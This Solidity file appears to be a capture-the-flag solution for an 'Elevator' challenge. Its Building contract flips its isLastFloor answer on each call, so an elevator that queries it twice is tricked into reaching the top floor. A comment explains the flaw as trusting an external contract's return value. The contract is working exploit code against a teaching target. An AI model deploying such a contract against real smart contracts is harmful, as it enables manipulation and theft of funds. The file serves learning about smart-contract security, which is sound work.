// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.0;


/// @notice Note that `isLastFloor` function is called twice in the same
/// function to check the value which shouldn't be the case from an external
/// call as you can't trust an external contract's. This can be easily hacked
/// with a function that just returns `false` first time and then `true`.

interface Elevator {
	  function goTo(uint _floor) external;
}

contract Building {
	Elevator e;
	bool private reverse;

	constructor (address elev) {
		e = Elevator(elev);
		reverse = true;
	}

	function isLastFloor(uint _floor) public returns (bool) {
		reverse = !reverse;
		return reverse;
	}

	function startHack() public {
		e.goTo(1);
	}
}